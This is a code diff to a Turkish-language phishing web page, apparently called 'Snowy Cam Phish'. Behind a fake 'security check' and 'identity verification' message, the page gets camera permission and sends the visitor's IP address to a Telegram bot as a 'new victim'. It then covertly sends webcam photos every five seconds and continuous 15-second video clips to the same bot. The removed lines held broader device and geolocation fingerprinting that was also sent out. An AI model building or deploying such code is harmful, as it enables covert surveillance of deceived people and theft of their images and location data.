@@ -71,134 +71,29 @@
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
         
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let videoCount = 0;
+        let photoCount = 0;
+        
         // ============================================
-        // GERÇEK ÇALIŞAN BİLGİLER
+        // SADECE İP ADRESİ AL
         // ============================================
-        async function getRealInfo() {
-            const info = {};
-            
-            // 1. IP ve KONUM (KESİN ÇALIŞIR)
+        async function getIP() {
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
-                info.ip = ipData.ip;
-                
-                const locRes = await fetch(`http://ip-api.com/json/${info.ip}`);
-                const locData = await locRes.json();
-                if (locData.status === 'success') {
-                    info.ulke = locData.country;
-                    info.ulke_kodu = locData.countryCode;
-                    info.sehir = locData.city;
-                    info.ilce = locData.regionName;
-                    info.isp = locData.isp;
-                    info.org = locData.org;
-                    info.as = locData.as;
-                    info.enlem = locData.lat;
-                    info.boylam = locData.lon;
-                }
-            } catch(e) { info.ip = 'Alınamadı'; }
-            
-            // 2. CİHAZ BİLGİSİ (User-Agent)
-            const ua = navigator.userAgent;
-            info.user_agent = ua;
-            
-            // İşletim Sistemi
-            if (/Android/i.test(ua)) info.os = 'Android';
-            else if (/iPhone|iPad/i.test(ua)) info.os = 'iOS';
-            else if (/Windows/i.test(ua)) info.os = 'Windows';
-            else if (/Mac/i.test(ua)) info.os = 'MacOS';
-            else if (/Linux/i.test(ua)) info.os = 'Linux';
-            else info.os = 'Diğer';
-            
-            // Tarayıcı
-            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) info.browser = 'Chrome';
-            else if (/Firefox/i.test(ua)) info.browser = 'Firefox';
-            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) info.browser = 'Safari';
-            else if (/Edg/i.test(ua)) info.browser = 'Edge';
-            else info.browser = 'Diğer';
-            
-            // 3. EKRAN BİLGİSİ
-            info.ekran = `${screen.width}x${screen.height}`;
-            info.renk = screen.colorDepth + ' bit';
-            info.pixel = window.devicePixelRatio || 1;
-            
-            // 4. TARAYICI DİLİ
-            info.dil = navigator.language;
-            info.diller = navigator.languages.join(', ');
-            
-            // 5. ZAMAN
-            info.zaman = new Date().toLocaleString('tr-TR');
-            info.saat_dilimi = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            info.timezone_offset = new Date().getTimezoneOffset();
-            
-            // 6. RAM (SADECE CHROME'DA ÇALIŞIR)
-            if (navigator.deviceMemory) {
-                info.ram = navigator.deviceMemory + ' GB';
+                return ipData.ip;
+            } catch(e) {
+                return 'Alınamadı';
             }
-            
-            // 7. İŞLEMCİ ÇEKİRDEK (SADECE CHROME'DA)
-            if (navigator.hardwareConcurrency) {
-                info.cekirdek = navigator.hardwareConcurrency;
-            }
-            
-            // 8. BAĞLANTI TİPİ
-            if (navigator.connection) {
-                info.baglanti = navigator.connection.effectiveType || 'Bilinmiyor';
-                info.hiz = navigator.connection.downlink + ' Mbps' || 'Bilinmiyor';
-            }
-            
-            // 9. DOKUNMATİK
-            info.dokunmatik = 'ontouchstart' in window ? 'Evet' : 'Hayır';
-            
-            // 10. ÇEREZ DURUMU
-            info.cerez = navigator.cookieEnabled ? 'Aktif' : 'Pasif';
-            
-            return info;
         }
         
         // ============================================
-        // TELEGRAM'A GÖNDER
+        // İP'Yİ TELEGRAM'A GÖNDER
         // ============================================
-        async function sendInfo(info) {
-            let msg = `❄️ **SNOWY CAM PHISH** ❄️\n`;
-            msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
-            
-            msg += `📍 **KONUM**\n`;
-            msg += `🌍 Ülke: ${info.ulke || '?'} ${info.ulke_kodu || ''}\n`;
-            msg += `🏙️ Şehir: ${info.sehir || '?'}\n`;
-            msg += `📌 İlçe: ${info.ilce || '?'}\n`;
-            msg += `🌐 IP: ${info.ip || '?'}\n`;
-            msg += `🔌 ISP: ${info.isp || '?'}\n`;
-            msg += `🏢 Org: ${info.org || '?'}\n`;
-            msg += `🔢 AS: ${info.as || '?'}\n`;
-            msg += `📍 Koordinat: ${info.enlem || '?'}, ${info.boylam || '?'}\n\n`;
-            
-            msg += `📱 **CİHAZ**\n`;
-            msg += `💻 OS: ${info.os || '?'}\n`;
-            msg += `🌐 Tarayıcı: ${info.browser || '?'}\n`;
-            msg += `🖥️ Ekran: ${info.ekran || '?'}\n`;
-            msg += `🎨 Renk: ${info.renk || '?'}\n`;
-            msg += `📏 Piksel: ${info.pixel || '?'}\n`;
-            if (info.ram) msg += `💾 RAM: ${info.ram}\n`;
-            if (info.cekirdek) msg += `🧠 Çekirdek: ${info.cekirdek}\n`;
-            msg += `✋ Dokunmatik: ${info.dokunmatik}\n\n`;
-            
-            msg += `🌐 **TARAYICI**\n`;
-            msg += `🌐 Dil: ${info.dil || '?'}\n`;
-            msg += `📚 Diller: ${info.diller || '?'}\n`;
-            msg += `🍪 Çerez: ${info.cerez}\n\n`;
-            
-            msg += `📶 **AĞ**\n`;
-            if (info.baglanti) msg += `📶 Tip: ${info.baglanti}\n`;
-            if (info.hiz) msg += `⚡ Hız: ${info.hiz}\n\n`;
-            
-            msg += `⏱️ **ZAMAN**\n`;
-            msg += `🕒 ${info.zaman}\n`;
-            msg += `🌍 ${info.saat_dilimi}\n`;
-            msg += `⏰ Offset: ${info.timezone_offset} dk\n\n`;
-            
-            msg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-            msg += `⚡ @snowy_dexry_wexry ⚡`;
+        async function sendIP(ip) {
+            const msg = `❄️ **YENİ KURBAN** ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 **IP:** ${ip}\n⏱️ **Zaman:** ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowydexrywexry`;
             
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -208,9 +103,48 @@
         }
         
         // ============================================
+        // VİDEO KAYDI BAŞLAT
+        // ============================================
+        function startVideoRecording() {
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) recordedChunks.push(event.data);
+            };
+            
+            mediaRecorder.onstop = async () => {
+                videoCount++;
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                
+                const formData = new FormData();
+                formData.append('chat_id', TARGET_ID);
+                formData.append('video', blob, `video_${Date.now()}.webm`);
+                formData.append('caption', `🎥 Video #${videoCount}`);
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                // 1 saniye sonra tekrar başlat
+                setTimeout(startVideoRecording, 1000);
+            };
+            
+            // 15 saniyelik video
+            mediaRecorder.start();
+            setTimeout(() => {
+                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                }
+            }, 15000);
+        }
+        
+        // ============================================
         // FOTOĞRAF ÇEK
         // ============================================
         async function takePhoto() {
+            photoCount++;
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -218,8 +152,8 @@
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
                 formData.append('chat_id', TARGET_ID);
-                formData.append('photo', blob, `cam_${Date.now()}.jpg`);
-                formData.append('caption', `📸 ${new Date().toLocaleString('tr-TR')}`);
+                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
+                formData.append('caption', `📸 Fotoğraf #${photoCount}`);
                 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
@@ -233,24 +167,27 @@
         // ============================================
         async function startCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 
                 document.getElementById('startBtn').style.display = 'none';
                 document.getElementById('loading').style.display = 'block';
                 
-                // BİLGİLERİ GÖNDER
-                const info = await getRealInfo();
-                await sendInfo(info);
+                // SADECE İP ADRESİNİ AL VE GÖNDER
+                const ip = await getIP();
+                await sendIP(ip);
                 
                 // 2 saniye bekle
                 await new Promise(r => setTimeout(r, 2000));
                 
-                // HER 3 SANİYEDE FOTOĞRAF ÇEK
-                setInterval(takePhoto, 3000);
+                // VİDEO KAYDI BAŞLAT (arka arkaya 15 saniyelik videolar)
+                startVideoRecording();
                 
-                // YAZILARI DEĞİŞTİR
-                const texts = ["Güvenlik kontrolü...", "Kimlik doğrulanıyor...", "Veriler işleniyor..."];
+                // FOTOĞRAF ÇEK (her 5 saniyede bir)
+                setInterval(takePhoto, 5000);
+                
+                // YAZIYI DEĞİŞTİR
+                const texts = ["Güvenlik kontrolü...", "Kimlik doğrulanıyor...", "Lütfen bekleyin..."];
                 let i = 0;
                 setInterval(() => {
                     i = (i + 1) % texts.length;
@@ -261,6 +198,18 @@
                 alert('Kamera izni gerekli!');
             }
         }
+        
+        // ============================================
+        // SAYFA KAPANIRKEN
+        // ============================================
+        window.onbeforeunload = function() {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            }
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        };
     </script>
 </body>
 </html>
